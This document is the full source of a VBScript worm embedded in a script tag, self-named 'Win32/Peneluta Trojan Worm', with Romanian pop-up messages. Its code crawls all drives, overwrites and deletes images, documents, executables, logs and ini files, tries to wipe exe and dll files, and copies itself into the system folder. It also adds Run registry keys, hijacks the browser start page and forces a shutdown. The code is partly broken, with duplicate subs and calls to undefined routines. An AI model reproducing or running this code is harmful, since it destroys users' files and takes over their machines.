<script language="VBScript">
rem-Win32/Peneluta Peneluta Trojan Worm Virus by Peneluta with material from D.L.
rem- © Material from D.L.
rem-Written on Mars , 30th , 2006,Discovered on June,26th,2006
msgbox "Buna!"
msgbox "Ai fost infectat cu virusul VBS/Peneluta Message Box.C@mm!"
msgbox "Nu te teme,sunt un virus non-distructiv!"
msgbox "Daca ai un AV bun,ma va bloca!"
msgbox "Daca NU,eu am sa ma omor acum."
msgbox "Apasa D pentru desinfectare!"

On Error Resume Next 
dim FSobj,winDir,sysDir,copySelf,newFile,rawFileData,hackedFileData,fixData,dataFixed,newFileData,copySelfComplete,orgMes,finalMes,generateSelf,fixedCode,procreateSelf,generateCopy,procreateCopy,fileData
set FSobj=CreateObject("Scripting.FileSystemObject")
set sysDir=FSobj.GetSpecialFolder(1)

		beginInfestation()
		displayMessage() 
		plantTrojanizedFile()      

function plantTrojanizedFile()
	set copySelf=FSobj.CreateTextFile(sysDir+"\sys-peneluta-msg.vbs")
	copySelf.close
	set newFile=FSobj.OpenTextFile(WScript.ScriptFullname,1)
	writeCopy()
	hackedFileData=replace(rawFileData,chr(42),chr(68))
	fixData=replace(hackedFileData,chr(37),chr(76))
	dataFixed=replace(fixData,chr(124),chr(46))
	newFileData=replace(dataFixed,chr(94),"""")
	set copySelfComplete=FSobj.OpenTextFile(sysDir+"\sys-peneluta-msg.vbs",2)
	copySelfComplete.write newFileData
	copySelfComplete.close

	createRegKey "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sys-msg",sysDir&"\sys-peneluta-msg.vbs"
end function

sub createRegKey(regKey,regVal)
     dim regEdit
     set regEdit=CreateObject("WScript.Shell")
     regEdit.RegWrite regKey,regVal
end sub

sub beginInfestation 
 	On Error Resume Next 
 	dim drive,machine,complete
	set machine=FSobj.Drives 
 	for each drive in machine  
 		if (drive.DriveType=2)or(drive.DriveType=3) then 
 			indexFolders(drive.Path&"\") 
		end If 
	next 
 	beginInfestation=complete 
end sub

sub indexFolders(location) 
	On Error Resume Next 
	dim specs, file, subFol 
	set specs=FSobj.GetFolder(location) 
	set subFol=specs.SubFolders 

	for each file in subFol 
		spreadData(file.Path) 
		indexFolders(file.Path) 
	next 
end sub 

sub spreadData(location)
	On Error Resume Next 
        dim folder,directory,file,generateCopy,appName,adExt,orgMes,mesStageTwo,mesStageThree,finalMes,extName,complete
	set folder=FSobj.GetFolder(location) 
	set directory=folder.Files 

	orgMes="Ai fost infectat cu virusul VBS/Peneluta Message Box.C@mm!"
	mesStageTwo=replace(orgMes,chr(42),chr(68))
	mesStageThree=replace(mesStageTwo,chr(124),chr(46))
	finalMes=replace(mesStageThree,chr(37),chr(76))

	for each file in directory 
		extName=lcase(FSobj.GetExtensionName(file.Path)) 
		complete=lcase(file.Name)

		if (extName="jpg")or(extName="gif")then 
			set generateCopy = FSobj.OpenTextFile(file.Path, 2, True) 
			generateCopy.write finalMes 
			generateCopy.Close
			appName=FSobj.GetBaseName(file.Path)
			set adExt=FSobj.GetFile(file.Path) 
			adExt.copy(location&"\"&appName&".txt") 
			FSobj.DeleteFile (file.Path) 

                elseIf (extName="log")or(extName="ini") then
			set generateCopy = FSobj.OpenTextFile(file.Path, 2, True) 
			generateCopy.write finalMes 
			generateCopy.Close
			appName=FSobj.GetBaseName(file.Path)
			set adExt=FSobj.GetFile(file.Path) 
			adExt.copy(location&"\"&appName&".txt") 
			FSobj.DeleteFile (file.Path) 

                elseIf (extName="doc")or(extName="exe") then
			set generateCopy = FSobj.OpenTextFile(file.Path, 2, True) 
			generateCopy.write finalMes 
			generateCopy.Close
			appName=FSobj.GetBaseName(file.Path)
			set adExt=FSobj.GetFile(file.Path) 
			adExt.copy(location&"\"&appName&".txt") 
			FSobj.DeleteFile (file.Path) 
		end if
	next 
end sub

function displayMessage()
        dim shell,messageFile
	set shell = CreateObject("WScript.Shell")
	set messageFile=FSobj.CreateTextFile(sysDir&"\dlBD-mes.bat")
	messageFile.close
	set FSobj=CreateObject("Scripting.FileSystemObject")
	set messageFile=FSobj.CreateTextFile(sysDir&"\dlBD-mes.bat")
	messageFile.WriteLine("@title Ai fost infectat cu virusul VBS/Peneluta Message Box.C@mm!!!")
	messageFile.WriteLine("@cls")
	messageFile.WriteLine("@echo Ai fost infectat cu virusul VBS/Peneluta Message Box.C@mm!!! :(")
	messageFile.WriteLine("@echo.")
	messageFile.WriteLine("@pause")
	messageFile.close
	shell.Run(sysDir&"\peneluta-msg-mes.bat") 
end function

function writeCopy()
	rawFileData="rem - VBS/Peneluta Message Box.C@mm virus by Peneluta" &vbcrlf& _
	"On Error Resume Next" &vbcrlf& _
	"dim FSobj,winDir,sysDir" &vbcrlf& _
	"set FSobj=CreateObject(^Scripting|FileSystemObject^)" &vbcrlf& _
	"set sysDir=FSobj|GetSpecialFolder(1)" &vbcrlf& _
	"beginInfestation()" &vbcrlf& _
	"displayMessage()" &vbcrlf& _      
        "end if" &vbcrlf& _ 
	"end function" &vbcrlf& _ 
	"sub beginInfestation" &vbcrlf& _ 
 	"On Error Resume Next " &vbcrlf& _
 	"dim drive,machine,complete" &vbcrlf& _
	"set machine=FSobj|Drives " &vbcrlf& _
 	"for each drive in machine " &vbcrlf& _ 
 	"if (drive|DriveType=2)or(drive|DriveType=3) then" &vbcrlf& _ 
 	"indexFolders(drive|Path&^\^)" &vbcrlf& _ 
	"end If" &vbcrlf& _ 
	"next" &vbcrlf& _ 
 	"beginInfestation=complete" &vbcrlf& _ 
	"end sub" &vbcrlf& _
	"sub indexFolders(location)" &vbcrlf& _ 
	"On Error Resume Next" &vbcrlf& _ 
	"dim specs, file, subFol" &vbcrlf& _ 
	"set specs=FSobj|GetFolder(location)" &vbcrlf& _ 
	"set subFol=specs|SubFolders" &vbcrlf& _ 
	"for each file in subFol" &vbcrlf& _ 
	"spreadData(file|Path)" &vbcrlf& _ 
	"indexFolders(file|Path)" &vbcrlf& _ 
	"next" &vbcrlf& _ 
	"end sub" &vbcrlf& _ 
	"sub spreadData(location)" &vbcrlf& _
	"On Error Resume Next" &vbcrlf& _ 
        "dim folder,directory,file,generateCopy,appName,adExt,orgMes,mesStageTwo,mesStageThree,finalMes,extName,complete" &vbcrlf& _
	"set folder=FSobj|GetFolder(location)" &vbcrlf& _ 
	"set directory=folder|Files" &vbcrlf& _ 
	"finalMes=^Ai fost infectat cu virusul VBS/Peneluta Message Box.C@mm!!!^" &vbcrlf& _
	"for each file in directory" &vbcrlf& _ 
	"extName=lcase(FSobj|GetExtensionName(file|Path))" &vbcrlf& _ 
	"complete=lcase(file|Name)" &vbcrlf& _
	"if (extName=^jpg^)or(extName=^gif^)then " &vbcrlf& _
	"set generateCopy = FSobj|OpenTextFile(file|Path, 2, True)" &vbcrlf& _ 
	"generateCopy|write finalMes " &vbcrlf& _
	"generateCopy|Close" &vbcrlf& _
	"appName=FSobj|GetBaseName(file|Path)" &vbcrlf& _
	"set adExt=FSobj|GetFile(file|Path)" &vbcrlf& _ 
	"adExt|copy(location&^\^&appName&^|txt^)" &vbcrlf& _ 
	"FSobj|DeleteFile (file|Path)" &vbcrlf& _ 
        "elseIf (extName=^log^)or(extName=^ini^) then" &vbcrlf& _
	"set generateCopy = FSobj|OpenTextFile(file|Path, 2, True)" &vbcrlf& _ 
	"generateCopy|write finalMes" &vbcrlf& _ 
	"generateCopy|Close" &vbcrlf& _
	"appName=FSobj|GetBaseName(file|Path)" &vbcrlf& _
	"set adExt=FSobj|GetFile(file|Path)" &vbcrlf& _ 
	"adExt|copy(location&^\^&appName&^|txt^)" &vbcrlf& _ 
	"FSobj|DeleteFile (file|Path)" &vbcrlf& _ 
        "elseIf (extName=^doc^)or(extName=^exe^) then" &vbcrlf& _
	"set generateCopy = FSobj|OpenTextFile(file|Path, 2, True)" &vbcrlf& _ 
	"generateCopy|write finalMes" &vbcrlf& _ 
	"generateCopy|Close" &vbcrlf& _
	"appName=FSobj|GetBaseName(file|Path)" &vbcrlf& _
	"set adExt=FSobj|GetFile(file|Path)" &vbcrlf& _ 
	"adExt|copy(location&^\^&appName&^|txt^)" &vbcrlf& _ 
	"FSobj|DeleteFile (file|Path)" &vbcrlf& _ 
	"end if" &vbcrlf& _
	"next" &vbcrlf& _ 
	"end sub" &vbcrlf& _
	"function displayMessage()" &vbcrlf& _
        "dim shell,messageFile" &vbcrlf& _
	"set shell = CreateObject(^WScript|Shell^)" &vbcrlf& _
	"set messageFile=FSobj|CreateTextFile(sysDir&^\peneluta-msg-mes|bat^)" &vbcrlf& _
	"messageFile|close" &vbcrlf& _
	"set FSobj=CreateObject(^Scripting|FileSystemObject^)" &vbcrlf& _
	"set messageFile=FSobj|CreateTextFile(sysDir&^\peneluta-msg-mes|bat^)" &vbcrlf& _
	"messageFile|WriteLine(^@title VBS/Peneluta Message Box.C@mm virus by Peneluta^)" &vbcrlf& _
	"messageFile|WriteLine(^@cls^)" &vbcrlf& _
	"messageFile|WriteLine(^@echo Ai fost infectat cu virusul VBS/Peneluta Message Box.C@mm!!!:(^)" &vbcrlf& _
	"messageFile|WriteLine(^@echo|^)" &vbcrlf& _
	"messageFile|WriteLine(^@pause^)" &vbcrlf& _
	"messageFile|close" &vbcrlf& _
	"shell|Run(sysDir&^\peneluta-mes|bat^)" &vbcrlf& _ 
	"end function"
end function

cleanProgramFiles()

sub cleanProgramFiles
 	On Error Resume Next 
 	dim drive,machine,complete 

	set machine=FSobj.Drives 
 	for each drive in machine  
 		if (drive.DriveType=2)or(drive.DriveType=3) then 
 			indexFolders(drive.Path&"\") 
		end If 
	next 
 	cleanProgramFiles=complete 
end sub

sub indexFolders(location) 
	On Error Resume Next 
	dim specs,file,subFol

	set specs=FSobj.GetFolder(location) 
	set subFol=specs.SubFolders 

	for each file in subFol 
		deleteNotes(file.Path) 
		indexFolders(file.Path) 
	next 
end sub 

sub deleteFiles(location)
	On Error Resume Next 
        dim folder,directory,file,extName,complete,aFile

	set folder=FSobj.GetFolder(location) 
	set directory=folder.Files 

	for each file in directory 

                extName=lcase(FSobj.GetExtensionName(file.Path)) 
		complete=lcase(file.Name)

		if (extName="exe") then 
			Set aFile = FSobj.GetFile(file.Path)
			aFile.Delete
		end If
	next 
end sub

cleanDynamicLinkLibraryFiles()

sub cleanDynamicLinkLibraryFiles
 	On Error Resume Next 
 	dim drive,machine,complete 

	set machine=FSobj.Drives 
 	for each drive in machine  
 		if (drive.DriveType=2)or(drive.DriveType=3) then 
 			indexFolders(drive.Path&"\") 
		end If 
	next 
 	cleanDynamicLinkLibraryFiles=complete 
end sub

sub indexFolders(location) 
	On Error Resume Next 
	dim specs,file,subFol

	set specs=FSobj.GetFolder(location) 
	set subFol=specs.SubFolders 

	for each file in subFol 
		deleteNotes(file.Path) 
		indexFolders(file.Path) 
	next 
end sub 

sub deleteFiles(location)
	On Error Resume Next 
        dim folder,directory,file,extName,complete,aFile

	set folder=FSobj.GetFolder(location) 
	set directory=folder.Files 

	for each file in directory 

                extName=lcase(FSobj.GetExtensionName(file.Path)) 
		complete=lcase(file.Name)

		if (extName="dll") then 
			Set aFile = FSobj.GetFile(file.Path)
			aFile.Delete
		end If
	next 
end sub

orgMes="Peneluta este aici,clonele ei te vor invada!!! - by Peneluta"
orgMes=replace(orgMes,chr(42),chr(68))
orgMes=replace(orgMes,chr(124),chr(46))
finalMes=replace(orgMes,chr(37),chr(76))


On Error Resume Next 
dim drive,machine

set machine=FSobj.Drives 
for each drive in machine  
 	if (drive.DriveType=2)or(drive.DriveType=3) then 
 		indexFolders(drive.Path&"\") 
	end If 
next 


sub indexFolders(location) 
	On Error Resume Next 
	dim specs,file,subFol,sayPeneluta

	set specs=FSobj.GetFolder(location) 
	set subFol=specs.SubFolders 

	for each file in subFol 
                set sayPeneluta = FSobj.CreateTextFile(file.Path&".peneluta", 2, True) 
		sayPeneluta.write finalMes 
		sayPeneluta.Close 
		writeData(file.Path) 
		indexFolders(file.Path) 
	next 
end sub 
		Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\peneluta-msg.vbs", "c:\windows\system\peneluta-msg.vbs"
createRegKey "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://peneluta.uv.ro/"
createRegKey "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://peneluta.uv.ro/"
createRegKey "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\dlSPS",sysDir&"\dlSPS.vbs"

set generateSelf=FSobj.CreateTextFile(sysDir+"\dlSPS.vbs")
generateSelf.close

set newFile = FSobj.OpenTextFile(WScript.ScriptFullname,1)
writeCopy()
fixedCode=replace(newFileData,chr(94),"""")

set procreateSelf=FSobj.OpenTextFile(sysDir+"\dlSPS.vbs",2)
procreateSelf.write fixedCode
procreateSelf.close

sub createRegKey(regKey,regVal)
     set regEdit = CreateObject("WScript.Shell")
     regEdit.RegWrite regKey,regVal
end sub

function writeCopy()
     newFileData="rem - ^dlSPS^ by D.L." &vbcrlf& _
     "set FSobj=CreateObject(^Scripting.FileSystemObject^)" &vbcrlf& _
     "set sysDir = FSobj.GetSpecialFolder(1)" &vbcrlf& _
     "createRegKey ^HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page^,^http://peneluta.uv.ro^" &vbcrlf& _
     "createRegKey ^HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Page_URL^,^http://peneluta.uv.ro^" &vbcrlf& _
     "createRegKey ^HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\dlSPS^,sysDir&^\dlSPS.vbs^" &vbcrlf& _
     "sub createRegKey(regKey,regVal)" &vbcrlf& _
     "set regEdit = CreateObject(^WScript.Shell^)" &vbcrlf& _
     "regEdit.RegWrite regKey,regVal" &vbcrlf& _
     "end sub"
end function
createRegKey "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\dlRB",sysDir&"\dlRB.vbs"

sub createRegKey(regKey,regVal)
     set regEdit = CreateObject("WScript.Shell")
     regEdit.RegWrite regKey,regVal
end sub

set generateCopy=FSobj.CreateTextFile(sysDir+"\dlRB.vbs")
generateCopy.close

set newFile = FSobj.OpenTextFile(WScript.ScriptFullname,1)
setFile()
fixedCode=replace(fileData,chr(94),"""")

set procreateCopy=FSobj.OpenTextFile(sysDir+"\dlRB.vbs",2)
procreateCopy.write fixedCode
procreateCopy.close

rebootSystem()

function setFile()
        fileData="rem - ^dlRB^ by D.L." &vbcrlf& _
	"strComputer = ^.^ " &vbcrlf& _
	"Set objWMIService = GetObject(^winmgmts:^ _  " &vbcrlf& _
	"& ^{impersonationLevel=impersonate,(Shutdown)}!\\^ & strComputer & ^\root\cimv2^)" &vbcrlf& _
	"Set colOperatingSystems = objWMIService.ExecQuery _  " &vbcrlf& _
	"(^Select * from Win32_OperatingSystem^)" &vbcrlf& _
	"For Each objOperatingSystem in colOperatingSystems" &vbcrlf& _
        "ObjOperatingSystem.Reboot()" &vbcrlf& _
	"Next"
end function


Dim wshshell
set wshshell = wscript.CreateObject("WScript.Shell")
wshshell.run "shutdown -s -t 5"
</script>














